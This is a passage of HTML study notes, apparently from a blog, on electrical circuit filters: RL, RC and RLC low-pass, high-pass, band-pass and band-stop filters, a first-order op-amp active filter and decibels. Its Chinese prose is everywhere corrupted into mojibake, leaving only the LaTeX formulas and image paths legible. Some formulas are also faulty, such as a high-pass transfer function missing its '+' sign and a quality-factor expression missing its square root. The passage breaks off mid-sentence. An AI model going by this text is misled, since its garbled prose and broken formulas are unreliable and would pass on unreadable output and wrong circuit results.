åªè¦é€‚å½“é€‰æ‹© R å’Œ L çš„å‚æ•°, æˆªæ­¢é¢‘ç‡ $\omega_c$ å¯ä»¥è®¾ç½®æˆä»»æ„å€¼. (å³è®¾è®¡ä»»æ„æˆªæ­¢é¢‘ç‡çš„ä½é€šæ»¤æ³¢å™¨)</p><p><mark>ç¤ºä¾‹</mark> , æ»¤æ‰ $10Hz$ ä»¥ä¸Šçš„ä¿¡å·, æ³¨æ„æ­¤æ—¶ $\omega_c$ çš„å€¼ä¸æ˜¯  $10Hz$, è€Œæ˜¯ $2 \pi \times (10) &#x3D; 20 \pi\ rad&#x2F;s$. ( $\omega &#x3D; 2 \pi f$)</p><h3 id="14-2-4-ä¸²è”-RC-ç”µè·¯"><a href="#14-2-4-ä¸²è”-RC-ç”µè·¯" class="headerlink" title="14.2.4 ä¸²è” RC ç”µè·¯"></a>14.2.4 ä¸²è” RC ç”µè·¯</h3><p><mark>å®šæ€§åˆ†æ</mark> å¯ä»¥é¢„æµ‹æ»¤æ³¢å™¨çš„ç‰¹æ€§ (ä½é€š, é«˜é€šç­‰), ä¹Ÿèƒ½é¢„æµ‹è½¬ç§»å‡½æ•°çš„ä¸€èˆ¬å½¢å¼.</p><p>è¿™é‡Œç”µè·¯çš„è¾“å‡ºå®šä¹‰ä¸º <mark>ç”µå®¹ä¸¤ç«¯çš„ç”µå‹</mark> :</p><p><img src="/../img/series_RC_low_pass_filter.png"></p><p>ç”±ä¸‰ä¸ªé¢‘ç‡ç¡®å®šæ€§è´¨:</p><p><img src="/../img/three_charac_of_RC_circuit_of_low_pass.png"></p><p>ç”±æ­¤å¯çŸ¥å…¶ä¸ºä½é€šæ»¤æ³¢å™¨.</p><blockquote><p>å¹…å€¼è®¡ç®—ä¸º:</p></blockquote><p>$$<br>\displaylines{\left\vert H(j \omega) \right\vert &#x3D; \frac{ \frac{1}{RC}}{\sqrt{ \omega^2 + ( \frac{1}{RC})^2}}}<br>$$</p><blockquote><p>æˆªæ­¢é¢‘ç‡ä¸º:</p></blockquote><p>$$<br>\displaylines{ \omega_c &#x3D; \frac{1}{RC}}<br>$$</p><p><mark>ä¸¤ä¸ªä½é€šæ»¤æ³¢å™¨çš„è½¬ç§»å‡½æ•°çš„é€šç”¨å¼å­ä¸º</mark> :<br>$$<br>\displaylines{H(s) &#x3D; \frac{\omega_c}{s + \omega_c}}<br>$$</p><p><img src="/../img/conclution_of_low_pass_RC_and_RL.png"></p><h3 id="14-2-5-é¢‘åŸŸå’Œæ—¶åŸŸçš„å…³ç³»"><a href="#14-2-5-é¢‘åŸŸå’Œæ—¶åŸŸçš„å…³ç³»" class="headerlink" title="14.2.5 é¢‘åŸŸå’Œæ—¶åŸŸçš„å…³ç³»"></a>14.2.5 é¢‘åŸŸå’Œæ—¶åŸŸçš„å…³ç³»</h3><p>ç”µè·¯çš„æ—¶é—´å¸¸æ•°å’Œæˆªæ­¢é¢‘ç‡çš„å…³ç³»:<br>$$<br>\displaylines{\tau &#x3D; \frac{1}{\omega_c}}<br>$$</p><p>å¦‚, RL ç”µè·¯çš„æ—¶é—´å¸¸æ•°ä¸º $\frac{L}{R}$, å…¶æˆªæ­¢é¢‘ç‡ä¸º $\frac{R}{L}$.</p><h2 id="14-3-é«˜é€šæ»¤æ³¢å™¨"><a href="#14-3-é«˜é€šæ»¤æ³¢å™¨" class="headerlink" title="14.3 é«˜é€šæ»¤æ³¢å™¨"></a>14.3 é«˜é€šæ»¤æ³¢å™¨</h2><p>ä½œä¸ºé«˜é€šæ»¤æ³¢å™¨çš„ä¸¤ä¸ªç”µè·¯:</p><ul><li>ä¸²è” RL ç”µè·¯</li><li>ä¸²è” RC ç”µè·¯</li></ul><p>åŒæ ·çš„ç”µè·¯, æ ¹æ®æ‰€é€‰çš„è¾“å‡ºç”µå‹ä¸åŒ, å¯ä»¥åœ¨ä½é€šæ»¤æ³¢å™¨å’Œé«˜é€šæ»¤æ³¢å™¨ä¸­è½¬æ¢. </p><p>å¯¹äºé«˜é€šæ»¤æ³¢å™¨ $H_{max} &#x3D; \left\vert H(j \infty) \right\vert$</p><h3 id="14-3-1-ä¸²è”-RC-ç”µè·¯-â€“-å®šæ€§åˆ†æ"><a href="#14-3-1-ä¸²è”-RC-ç”µè·¯-â€“-å®šæ€§åˆ†æ" class="headerlink" title="14.3.1 ä¸²è” RC ç”µè·¯ â€“ å®šæ€§åˆ†æ"></a>14.3.1 ä¸²è” RC ç”µè·¯ â€“ å®šæ€§åˆ†æ</h3><p>æ¯”å¦‚æ­¤æ—¶çš„è¾“å‡ºç”µå‹ä¸º <mark>ç”µé˜»ä¸¤ç«¯çš„ç”µå‹</mark> (ä½é€šä¸ºç”µå®¹ä¸¤ç«¯ç”µå‹)</p><p><img src="/../img/high_pass_circuit_seri_RC.png"></p><p>ç»“è®ºå›¾:</p><p><img src="/../img/high_pass_circuit_RC_frequency_response.png"></p><h3 id="14-3-2-ä¸²è”-RC-ç”µè·¯-â€“-å®šé‡åˆ†æ"><a href="#14-3-2-ä¸²è”-RC-ç”µè·¯-â€“-å®šé‡åˆ†æ" class="headerlink" title="14.3.2 ä¸²è” RC ç”µè·¯ â€“ å®šé‡åˆ†æ"></a>14.3.2 ä¸²è” RC ç”µè·¯ â€“ å®šé‡åˆ†æ</h3><p>ä¸‹å›¾:</p><p><img src="/../img/high_pass_circuit_seri_RC.png"></p><p>åœ¨ s åŸŸçš„ç­‰æ•ˆæ¨¡å‹ä¸º:</p><p><img src="/../img/high_pass_circuit_RC_s_domain_equivlant_circuit.png"></p><blockquote><p>è½¬ç§»å‡½æ•°:<br>$$<br>\displaylines{H(s) &#x3D; \frac{s}{s+ \frac{1}{RC}} \newline~ \newline<br>ä»¤\ s &#x3D; j \omega: \newline~ \newline<br>H(j \omega) &#x3D; \frac{j \omega}{j \omega 1&#x2F;RC}}<br>$$<br>(è¿™é‡ŒåŒæ ·æ˜¯åˆ©ç”¨ç”µé˜»é˜»æŠ—å’Œæ€»é˜»æŠ—ä¹‹æ¯”è¡¨ç¤º)</p></blockquote><blockquote><p>å¾—åˆ°è½¬ç§»å‡½æ•°å¹…å€¼æ–¹ç¨‹å’Œç›¸ä½è§’æ–¹ç¨‹:<br>$$<br>\displaylines{ \left\vert H(j \omega) \right\vert &#x3D; \frac{\omega}{\sqrt{\omega^2 + (1&#x2F;RC)^2}} \newline~ \newline<br>\theta(j \omega) &#x3D; 90^\circ - arctan \omega RC}<br>$$</p></blockquote><blockquote><p>æˆªæ­¢é¢‘ç‡è®¡ç®—<br>$$<br>\displaylines{ \frac{1}{\sqrt{2}} &#x3D; \frac{\omega_c}{\sqrt{\omega_c^2 + (1&#x2F;RC)^2}} \newline~ \newline<br>\therefore \omega_c &#x3D; \frac{1}{RC}}<br>$$</p></blockquote><p><mark>æ³¨æ„</mark> , ä¸è®ºå°†åŒä¸€ä¸ªç”µè·¯æ”¹æˆé«˜é€šç”µè·¯è¿˜æ˜¯ä½é€š, å…¶ <mark>æˆªæ­¢é¢‘ç‡ä¸å˜</mark> (æ¯”è¾ƒæ—¶é—´å¸¸æ•°æ²¡å˜)</p><p><mark>ä¸²è” RL é«˜é€šæ»¤æ³¢å™¨</mark><br>æ­¤æ—¶çš„è¾“å‡ºç”µå‹ä¸º <mark>ç”µæ„Ÿ L</mark> ä¸¤ç«¯ç”µå‹.</p><p><img src="/../img/high_pass_RL_circuit.png"></p><p>è½¬ç§»å‡½æ•°ä¸º:<br>$$<br>\displaylines{H(s) &#x3D; \frac{s}{s + R&#x2F;L} \newline~ \newline<br>ä»¤ s &#x3D; j \omega: \newline~ \newline<br>H(j \omega) &#x3D; \frac{j \omega}{j \omega + R&#x2F;L}}<br>$$</p><p>å¹…å€¼:<br>$$<br>\displaylines{ \left\vert H(j \omega) \right\vert &#x3D; \frac{\omega}{\sqrt{ \omega^2 + (R&#x2F;L)^2}}}<br>$$</p><p>æˆªæ­¢é¢‘ç‡ä¸º:<br>$$<br>\displaylines{ \frac{1}{\sqrt{2}} &#x3D; \frac{\omega_c}{\sqrt{\omega_c^2 + (R&#x2F;L)^2}} \newline~ \newline<br>\therefore \omega_c &#x3D; \frac{R}{L}}<br>$$<br>(åŒæ ·æ²¡å˜)</p><p><mark>å¸¦è´Ÿè½½çš„ä¸²è” RL é«˜é€šæ»¤æ³¢å™¨</mark><br>å›¾åƒå¦‚:</p><p><img src="/../img/high_pass_RL_with_load_circuit.png"></p><p>è½¬ç§»å‡½æ•°ä¸º:<br>$$<br>\displaylines{H(s) &#x3D; \frac{ \frac{R_L s L}{R_L + s L}}{R +  \frac{R_L s L}{R_L + s L}} &#x3D; \frac{( \frac{R_L}{R + R_L})s}{s + ( \frac{R_L}{R + R_L}) \frac{R}{L}} &#x3D; \frac{K s}{s + \omega_c} \newline~ \newline<br>å…¶ä¸­ \newline~ \newline<br>K &#x3D; \frac{R_L}{R + R_L},\ \omega_c &#x3D; K R&#x2F;L}<br>$$</p><p><mark>å°†æ— è´Ÿè½½æ»¤æ³¢å™¨å’Œå¸¦è´Ÿè½½æ»¤æ³¢å™¨è¿›è¡Œå¯¹æ¯”</mark> :<br>$$<br>\displaylines{H(s) &#x3D; \frac{K s}{s + K (R&#x2F;L)}}<br>$$<br>å¾—å‡º, å¯¹äº <mark>æ— è´Ÿè½½æ»¤æ³¢å™¨</mark> è€Œè¨€, $K &#x3D; 1$, å¯¹äº <mark>æœ‰è´Ÿè½½æ»¤æ³¢å™¨</mark> è€Œè¨€, $K &#x3D; R_L &#x2F; (R + R_L)$.</p><p>å¯ä»¥å¾—å‡º: åœ¨æ»¤æ³¢å™¨ä¸­åŠ è´Ÿè½½ä¼š<mark>å‡å°å…¶è¾“å‡ºå¹…å€¼</mark>.</p><h2 id="14-4-å¸¦é€šæ»¤æ³¢å™¨"><a href="#14-4-å¸¦é€šæ»¤æ³¢å™¨" class="headerlink" title="14.4 å¸¦é€šæ»¤æ³¢å™¨"></a>14.4 å¸¦é€šæ»¤æ³¢å™¨</h2><p>ç†æƒ³çš„å¸¦é€šæ»¤æ³¢å™¨æœ‰ä¸¤ä¸ªæˆªæ­¢é¢‘ç‡ $\omega_{c1}\ å’Œ\ \omega_{c2}$, è¿™ä¸¤ä¸ªé¢‘ç‡ç¡®å®šäº†é€šå¸¦.</p><h3 id="14-4-1-ä¸­å¿ƒé¢‘ç‡-å¸¦å®½å’Œå“è´¨å› æ•°"><a href="#14-4-1-ä¸­å¿ƒé¢‘ç‡-å¸¦å®½å’Œå“è´¨å› æ•°" class="headerlink" title="14.4.1 ä¸­å¿ƒé¢‘ç‡, å¸¦å®½å’Œå“è´¨å› æ•°"></a>14.4.1 ä¸­å¿ƒé¢‘ç‡, å¸¦å®½å’Œå“è´¨å› æ•°</h3><p>ä¸‰ä¸ªè¡¨å¾å¸¦é€šæ»¤æ³¢å™¨çš„å‚æ•°:</p><ol><li>ä¸­å¿ƒé¢‘ç‡ (è°æŒ¯é¢‘ç‡) $\omega_o$, å®šä¹‰ä¸ºå½“ç”µè·¯çš„è½¬ç§»å‡½æ•°åˆ†æ¯ä¸ºçº¯å®æ•°æ—¶çš„é¢‘ç‡å€¼, ä¹Ÿæ˜¯é€šå¸¦çš„<mark>å‡ ä½•ä¸­å¿ƒ</mark> $\omega_o &#x3D; \sqrt{\omega_{c1} \omega_{c2}}$, ä¸”æ­¤æ—¶è½¬ç§»å‡½æ•°çš„ <mark>å¹…å€¼æœ€å¤§</mark> </li><li>å¸¦å®½ $\beta$, é€šå¸¦çš„å®½åº¦, å…¶å€¼ä¸ºä¸¤ä¸ªæˆªæ­¢é¢‘ç‡ä¹‹å·® $\beta &#x3D; \omega_{c2} - \omega_{c1}$ (è°å‡è°è§†æƒ…å†µè€Œå®š)</li><li>å“è´¨å› æ•° $Q$, æ˜¯ä¸­å¿ƒé¢‘ç‡å’Œå®½å¸¦çš„æ¯”å€¼</li></ol><p>5 ä¸ªç‰¹å¾å‚æ•°: $\omega_{c1},\ \omega_{c2},\ \omega_0,\ \beta\ å’Œ\ Q$, åªæœ‰ä¸¤ä¸ªå‚æ•°ç‹¬ç«‹ (å·²çŸ¥ä»»ä½•ä¸¤ä¸ª, å¯ä»¥è®¡ç®—å‡ºå…¶ä»–ä¸‰ä¸ª)</p><h3 id="14-4-2-ä¸²è”-RLC-ç”µè·¯-â€“-å®šæ€§åˆ†æ"><a href="#14-4-2-ä¸²è”-RLC-ç”µè·¯-â€“-å®šæ€§åˆ†æ" class="headerlink" title="14.4.2 ä¸²è” RLC ç”µè·¯ â€“ å®šæ€§åˆ†æ"></a>14.4.2 ä¸²è” RLC ç”µè·¯ â€“ å®šæ€§åˆ†æ</h3><p>å¦‚å›¾:</p><p><img src="/../img/brand_pass_seri_RLC.png"></p><p>è€ƒè™‘åˆ°, ç”µå®¹çš„é˜»æŠ—ä¸ºè´Ÿ, ç”µæ„Ÿçš„é˜»æŠ—ä¸ºæ­£, åœ¨æŸä¸€é¢‘ç‡ä¸Š, <mark>ç”µå®¹çš„é˜»æŠ—å’Œç”µæ„Ÿçš„é˜»æŠ—ä¼šå¤§å°ç›¸ç­‰, ç¬¦å·ç›¸å, ç›¸äº’æŠµæ¶ˆ, æ­¤æ—¶, è¾“å‡ºç”µå‹ç­‰äºè¾“å…¥ç”µå‹</mark> (è¿™ä¸€ç‰¹æ®Šé¢‘ç‡å°±æ˜¯ä¸­å¿ƒé¢‘ç‡)</p><p>é¢‘ç‡å“åº”æ›²çº¿:</p><p><img src="/../img/brand_pass_seri_RLC_frequency_response.png"></p><h3 id="14-4-3-ä¸²è”-RLC-ç”µè·¯-â€“-å®šé‡åˆ†æ"><a href="#14-4-3-ä¸²è”-RLC-ç”µè·¯-â€“-å®šé‡åˆ†æ" class="headerlink" title="14.4.3 ä¸²è” RLC ç”µè·¯ â€“ å®šé‡åˆ†æ"></a>14.4.3 ä¸²è” RLC ç”µè·¯ â€“ å®šé‡åˆ†æ</h3><p>å›¾:</p><p><img src="/../img/brand_pass_seri_RLC.png"></p><p>åœ¨ s åŸŸçš„ç­‰æ•ˆæ¨¡å‹ä¸º:</p><p><img src="/../img/brand_pass_seri_RLC_s_domain_equiavlent_circuit.png"></p><p>è½¬ç§»å‡½æ•°ä¸º:</p><p>$$<br>\displaylines{H(s) &#x3D; \frac{(R&#x2F;L)s}{s^2 + (R&#x2F;L)s + (1&#x2F;LC)} \newline~ \newline<br>(åŒæ ·æ˜¯åˆ©ç”¨ç”µé˜»çš„é˜»æŠ—ä¸æ€»é˜»æŠ—ä¹‹æ¯”, ç­‰æ•ˆäºè¾“å‡ºç”µå‹ä¸è¾“å…¥ç”µå‹ä¹‹æ¯”)}<br>$$</p><p>å¹…å€¼å’Œç›¸ä½è§’æ–¹ç¨‹:<br>$$<br>\displaylines{ \left\vert H(j \omega) \right\vert &#x3D; \frac{\omega (R&#x2F;L)}{\sqrt{[(1&#x2F;LC) - \omega^2]^2 + [\omega (R&#x2F;L)]^2}} \newline~ \newline<br>\theta (j \omega) &#x3D; 90^\circ - arctan[ \frac{\omega (R&#x2F;L)}{(1&#x2F;LC) - \omega^2}]}<br>$$</p><blockquote><p>æ±‚è§£ä¸­å¿ƒé¢‘ç‡ $\omega_o$</p></blockquote><p>å½“ç”µæ„Ÿå’Œç”µå®¹çš„é˜»æŠ—ç›¸åŠ ä¸ºé›¶æ—¶:<br>$$<br>\displaylines{j \omega_o L + \frac{1}{j \omega_o C} &#x3D; 0 \newline~ \newline<br>\omega_o &#x3D; \sqrt{ \frac{1}{LC}}<br>$$</p><blockquote><p>è®¡ç®—æˆªæ­¢é¢‘ç‡ $\omega_{c1}\ å’Œ\ \omega_{c2}$, å½“è½¬ç§»å‡½æ•°çš„å¹…å€¼ä¸º $(1&#x2F;\sqrt{2})H_{max}$ æ—¶ (è¿™é‡Œ $H_{max} &#x3D; \left\vert H(j \omega_o) \right\vert$)</p></blockquote><p>å…ˆè®¡ç®— $H_{max}$ (æ³¨æ„æ­¤æ—¶æœ‰ä¸€ä¸ªå·²çŸ¥æ¡ä»¶, å³æ­¤æ—¶çš„é¢‘ç‡ä¸º $\omega_o$)<br>$$<br>\displaylines{H_{max} &#x3D; \left\vert H(j \omega_o) \right\vert \newline~ \newline<br>&#x3D; 1 \ (çœç•¥äº†ä¸­é—´, å…·ä½“çœ‹ä¹¦)<br>}<br>$$</p><p>å› æ­¤æˆªæ­¢é¢‘ç‡è®¡ç®—ä¸º:</p><p>$$<br>\displaylines{ \frac{1}{\sqrt{2}} &#x3D; \frac{\omega_c (R&#x2F;L)}{\sqrt{[(1&#x2F;LC) - \omega_c^2]^2 + [\omega_c (R&#x2F;L)]^2}} \newline~ \newline<br>æœ€ç»ˆå¯å¾—: \newline~ \newline<br>\pm 1 &#x3D; \omega_c \frac{L}{R} - \frac{1}{\omega_c RC} \newline~ \newline<br>\omega_c^2 L \pm \omega_c R - \frac{1}{C} &#x3D; 0 \newline~ \newline<br>è§£å‡º: \newline~ \newline<br>\omega_{c1} &#x3D; - \frac{R}{2L} + \sqrt{( \frac{R}{2L})^2 + ( \frac{1}{LC})} \newline~ \newline<br>\omega_{c2} &#x3D;  \frac{R}{2L} + \sqrt{( \frac{R}{2L})^2 + ( \frac{1}{LC})} \newline~ \newline<br>(è§£å‡ºæœ‰å››ä¸ª,\ ä¸¤ä¸ªä¸ºæ­£æ•°,\ è¿™é‡Œåº”è¯¥æŠŠä¸Šé¢çš„ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹é™¤ä»¥äº†\ 2L)<br>}<br>$$</p><blockquote><p>å¸¦å®½è®¡ç®—</p></blockquote><p>è¿™é‡Œ $\omega_{c2} &gt; \omega_{c1}$</p><p>$$<br>\displaylines{\beta  &#x3D; \omega_{c2} - \omega_{c1} \newline~ \newline<br>&#x3D; \frac{R}{L} \newline~ \newline<br>(è®¡ç®—è¿‡ç¨‹ç®€å†™äº†)}<br>$$</p><blockquote><p>å“è´¨å› æ•°è®¡ç®— (ä¸­å¿ƒé¢‘ç‡ä¸å¸¦å®½ä¹‹æ¯”)</p></blockquote><p>$$<br>\displaylines{Q &#x3D; \frac{\omega_o}{\beta} &#x3D; \frac{(1&#x2F;LC)}{R&#x2F;L} &#x3D; \sqrt{ \frac{L}{CR^2}}}<br>$$</p><blockquote><p>å¦å¤–æ¨å¯¼å‡ºçš„å…¬å¼</p></blockquote><p><img src="/../img/four_other_formula_of_five_factors_of_brand_filter.png"></p><h3 id="14-4-4-æ—¶åŸŸä¸é¢‘åŸŸçš„å…³ç³»"><a href="#14-4-4-æ—¶åŸŸä¸é¢‘åŸŸçš„å…³ç³»" class="headerlink" title="14.4.4 æ—¶åŸŸä¸é¢‘åŸŸçš„å…³ç³»"></a>14.4.4 æ—¶åŸŸä¸é¢‘åŸŸçš„å…³ç³»</h3><h2 id="14-5-å¸¦é˜»æ»¤æ³¢å™¨"><a href="#14-5-å¸¦é˜»æ»¤æ³¢å™¨" class="headerlink" title="14.5 å¸¦é˜»æ»¤æ³¢å™¨"></a>14.5 å¸¦é˜»æ»¤æ³¢å™¨</h2><p>å°†ä¸¤ä¸ªæˆªæ­¢é¢‘ç‡å¤–ä¾§çš„ç”µæºç”µå‹ä¿¡å·ä¼ è¾“åˆ°è¾“å‡ºç«¯.</p><p>åŒæ ·å…·æœ‰äº”ä¸ªç‰¹æ€§å‚æ•°, ä¸¤ä¸ªæˆªæ­¢é¢‘ç‡, ä¸­å¿ƒé¢‘ç‡, å¸¦å®½å’Œå“è´¨å› æ•°.</p><h3 id="14-5-1-ä¸²è”-RLC-ç”µè·¯-â€“-å®šæ€§åˆ†æ"><a href="#14-5-1-ä¸²è”-RLC-ç”µè·¯-â€“-å®šæ€§åˆ†æ" class="headerlink" title="14.5.1 ä¸²è” RLC ç”µè·¯ â€“ å®šæ€§åˆ†æ"></a>14.5.1 ä¸²è” RLC ç”µè·¯ â€“ å®šæ€§åˆ†æ</h3><p>å’Œä¸²è” RLC å¸¦é€šæ»¤æ³¢å™¨çš„ç”µè·¯å›¾ç›¸åŒ, åªä¸è¿‡æ­¤æ—¶çš„ <mark>è¾“å‡ºç”µå‹ä¸ºç”µå®¹å’Œç”µæ„Ÿä¸²è”çš„ç”µå‹</mark> :</p><p><img src="/../img/brand_elimination_filter_RLC_circuit.png"></p><p>é¢‘ç‡å“åº”æ›²çº¿:</p><p><img src="/../img/brand_elimination_filter_RLC_circuit_frequency_response.png"></p><h3 id="14-5-2-ä¸²è”-RLC-ç”µè·¯-â€“-å®šé‡åˆ†æ"><a href="#14-5-2-ä¸²è”-RLC-ç”µè·¯-â€“-å®šé‡åˆ†æ" class="headerlink" title="14.5.2 ä¸²è” RLC ç”µè·¯ â€“ å®šé‡åˆ†æ"></a>14.5.2 ä¸²è” RLC ç”µè·¯ â€“ å®šé‡åˆ†æ</h3><p>ä¸‹å›¾:</p><p><img src="/../img/band_elimination_filter_RLC_circuit_in_time_domain.png"></p><p>åœ¨ s åŸŸçš„ç­‰æ•ˆç”µè·¯ä¸º:</p><p><img src="/../img/band_elimination_filter_RLC_circuit_in_s_domain.png"></p><p>åŒæ ·åˆ©ç”¨åˆ†å‹å…¬å¼å†™å‡ºè½¬ç§»å‡½æ•°:</p><p>$$<br>\displaylines{H(s) &#x3D; \frac{sL + \frac{1}{sC}}{R + sL + \frac{1}{sC}} &#x3D; \frac{s^2 + \frac{1}{LC}}{s^2 + \frac{R}{L}s + \frac{1}{LC}}}<br>$$</p><p>ä»¤ $s &#x3D; j \omega$, å¾—åˆ°å¹…å€¼å’Œç›¸ä½è§’æ–¹ç¨‹:<br>$$<br>\displaylines{ \left\vert H(j \omega) \right\vert &#x3D; \frac{ \left\vert \frac{1}{LC} - \omega^2 \right\vert}{\sqrt{ ( \frac{1}{LC} - \omega^2)^2 + ( \frac{\omega R}{L})^2}} \newline~ \newline<br>\theta (j \omega) &#x3D; -arctan( \frac{ \frac{\omega R}{L}}{ \frac{1}{LC} - \omega^2})}<br>$$</p><blockquote><p>è®¡ç®—ä¸­å¿ƒé¢‘ç‡</p></blockquote><p>åˆ©ç”¨ç”µå®¹å’Œç”µæ„Ÿçš„é˜»æŠ—ä¹‹å’Œä¸ºé›¶æ—¶çš„é¢‘ç‡, å¾—å‡º:</p><p>$$<br>\displaylines{\omega_o &#x3D; \sqrt{ \frac{1}{LC}}}<br>$$</p><blockquote><p>è®¡ç®—æˆªæ­¢é¢‘ç‡</p></blockquote><p>åˆ©ç”¨æ­¤æ—¶çš„å¹…å€¼ä¸º $(1&#x2F;\sqrt{2})H_{max}$, åˆ™ $\omega_{c1}\ å’Œ\ \omega_{c2}$ ä¸º:</p><p>$$<br>\displaylines{<br>\omega_{c1} &#x3D; - \frac{R}{2L} + \sqrt{( \frac{R}{2L})^2 + ( \frac{1}{LC})} \newline~ \newline<br>\omega_{c2} &#x3D;  \frac{R}{2L} + \sqrt{( \frac{R}{2L})^2 + ( \frac{1}{LC})} \newline~ \newline<br>}<br>$$</p><blockquote><p>å¸¦å®½è®¡ç®—, ä¸¤ä¸ªæˆªæ­¢é¢‘ç‡ä¹‹å·®, è¿™é‡Œä¸º $\omega_{c2} - \omega_{c1}$:</p></blockquote><p>$$<br>\displaylines{\beta &#x3D; R&#x2F;L}<br>$$</p><blockquote><p>è®¡ç®—å“è´¨å› æ•°, ä¸­å¿ƒé¢‘ç‡å’Œå¸¦å®½ä¹‹æ¯”</p></blockquote><p>$$<br>\displaylines{Q &#x3D; \sqrt{ \frac{L}{R^2 C}}}<br>$$</p><blockquote><p>å…¶ä»–æ¨å¯¼å‡ºçš„å…¬å¼</p></blockquote><p><img src="/../img/four_other_formula_of_five_factors_of_band_elimination_filter.png"></p><h1 id="ç¬¬15ç« -æœ‰æºæ»¤æ³¢å™¨ç”µè·¯"><a href="#ç¬¬15ç« -æœ‰æºæ»¤æ³¢å™¨ç”µè·¯" class="headerlink" title="ç¬¬15ç«  æœ‰æºæ»¤æ³¢å™¨ç”µè·¯"></a>ç¬¬15ç«  æœ‰æºæ»¤æ³¢å™¨ç”µè·¯</h1><p><mark>æ— æºæ»¤æ³¢å™¨</mark> , å³æ»¤æ³¢å™¨ç”µè·¯åªæ˜¯ç”±ç”µé˜», ç”µæ„Ÿ, ç”µå®¹ç»„æˆçš„.</p><p><mark>æœ‰æºæ»¤æ³¢å™¨</mark> , æ˜¯ä½¿ç”¨äº†ç†æƒ³è¿ç®—æ”¾å¤§å™¨çš„æ»¤æ³¢ç”µè·¯. å…¶ä¼˜ç‚¹æœ‰:</p><ul><li><mark>ä¸ç”¨ç”µæ„Ÿ</mark> å°±èƒ½å½¢æˆå¸¦é€šå’Œå¸¦é˜»æ»¤æ³¢å™¨</li><li>æ— æºæ»¤æ³¢å™¨çš„æœ€å¤§å¹…å€¼ä¸è¶…è¿‡ 1. è€Œæœ‰æºæ»¤æ³¢å™¨ <mark>èƒ½å¯¹å¹…å€¼è¿›è¡Œæ”¾å¤§æ§åˆ¶</mark> </li><li>æ— æºæ»¤æ³¢å™¨çš„æˆªæ­¢é¢‘ç‡å’Œé€šå¸¦å¹…å€¼ä¼šå› é˜»æ€§è´Ÿè½½çš„åŠ å…¥è€Œæ”¹å˜, æœ‰æºæ»¤æ³¢å™¨ç”±äºç†æƒ³è¿æ”¾çš„ç‰¹æ€§, ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µ</li></ul><h2 id="15-1-ä¸€é˜¶ä½é€šå’Œé«˜é€šæ»¤æ³¢å™¨"><a href="#15-1-ä¸€é˜¶ä½é€šå’Œé«˜é€šæ»¤æ³¢å™¨" class="headerlink" title="15.1 ä¸€é˜¶ä½é€šå’Œé«˜é€šæ»¤æ³¢å™¨"></a>15.1 ä¸€é˜¶ä½é€šå’Œé«˜é€šæ»¤æ³¢å™¨</h2><p>ä¸€é˜¶ä½é€šæ»¤æ³¢å™¨å¦‚å›¾:</p><p><img src="/../img/first_order_low_pass_filter.png"></p><p>è¿™é‡Œçš„è¿æ”¾ç›¸å½“äºä¸€ä¸ªæ”¾å¤§å€æ•°ä¸º $-\frac{R_2}{R_1}$ çš„æ”¾å¤§å™¨.</p><p>è½¬æ¢ä¸º s åŸŸç­‰æ•ˆç”µè·¯ä¸º:</p><p><img src="/../img/first_order_low_pass_filter_s_domain.png"></p><p>è¿™é‡Œ, $Z_i$ ä¸ºè¾“å…¥ç«¯ç”µé˜»çš„é˜»æŠ—, $Z_f$ ä¸ºåé¦ˆé€šé“ä¸Šç”µé˜»å’Œç”µå®¹å¹¶è”çš„é˜»æŠ—.</p><p>å› æ­¤:</p><p>$$<br>\displaylines{H(s) &#x3D; -\frac{Z_f}{Z_i} &#x3D; -K \frac{\omega_c}{s + \omega_c} \newline~ \newline<br>K &#x3D; \frac{R_2}{R_1} \newline~ \newline<br>\omega_c &#x3D; \frac{1}{R_2 C}}<br>$$</p><p>è¿™é‡Œçš„ $K$ åŒæ—¶å°±æ˜¯æ”¾å¤§å€æ•°.</p><h3 id="é™„å½•-D-åˆ†è´"><a href="#é™„å½•-D-åˆ†è´" class="headerlink" title="é™„å½• D åˆ†è´"></a>é™„å½• D åˆ†è´</h3><p>ä¸ºäº†è®¡ç®—ä¿¡å·é€šè¿‡çº§è”ç”µè·¯ (æ„Ÿè§‰å°±æ˜¯å‡ ä¸ªç›¸è¿çš„ç”µè·¯) åçš„åŠŸç‡æŸå¤±, å¼•å…¥çš„åˆ†è´. </p><p>å¦‚è¿™é‡Œçš„ä¸‰ä¸ªçº§è”çš„ç”µè·¯:</p><p><img src="/../img/three_cascade_circuit.png"></p><p>ä¸€ä¸ªæ¦‚å¿µ <mark>åŠŸç‡æ”¾å¤§ç³»æ•°</mark> , å°±æ˜¯è¾“å‡ºåŠŸç‡å’Œè¾“å…¥åŠŸç‡ä¹‹æ¯”. (å°äº 1 å½“ç„¶å°±æ˜¯æœ‰æŸè€—)</p><p>è¿™é‡Œçš„ä¸‰ä¸ªåŠŸç‡æ”¾å¤§ç³»æ•°ä¸º:<br>$$<br>\displaylines{ \sigma_A &#x3D; \frac{p_1}{p_i},\ \sigma_B &#x3D; \frac{p_2}{p_1},\ \sigma_C &#x3D; \frac{p_o}{p_2}}<br>$$</p><p>æ€»çš„ä¸º:<br>$$<br>\displaylines{ \frac{p_o}{p_i} &#x3D; \frac{p_1}{p_i} \frac{p_2}{p_1} \frac{p_o}{p_2} &#x3D; \sigma_A \sigma_B \sigma_C}<br>$$</p><p>é€šè¿‡å–å¯¹æ•°, å°†ä¹˜ç§¯è½¬åŒ–ä¸ºåŠ æ³•(å¯èƒ½æ˜¯ä¸ºäº†ç®€åŒ–è®¡ç®—):</p><p>$$<br>\displaylines{\lg \frac{p_o}{p_i} &#x3D; \lg \sigma_A + \lg \sigma_B + \lg \sigma_C}<br>$$</p><p>ä¸ºäº†çºªå¿µ Alexander Graham Bell, è¿™ä¸ª <mark>åŠŸç‡æ¯”çš„å¯¹æ•°</mark> ç§°ä¸º bel (è´å°”). ä½†è¿™ä¸ªæ•°ä¸€èˆ¬æ¯”è¾ƒå¤§, å°±å–å…¶ååˆ†ä¹‹ä¸€æ¥è®¡ç®—, ç§°ä¸ºåˆ†è´ (å¯èƒ½æ˜¯ 1 è§’é’±ç­‰äº 10 åˆ†é’±è¿™ç§å…³ç³», åˆ†å°±ä»£è¡¨ååˆ†ä¹‹ä¸€):<br>$$<br>\displaylines{åˆ†è´æ•° &#x3D; 10 \lg \frac{p_o}{p_i}}<br>$$</p><p>è€Œå½“ <mark>ç”µè·¯çš„è¾“å…¥ç”µé˜»ç­‰äºè´Ÿè½½ç”µé˜»</mark> æ—¶, å¯ä»¥å°†åŠŸç‡ä¹‹æ¯”è½¬åŒ–ä¸º 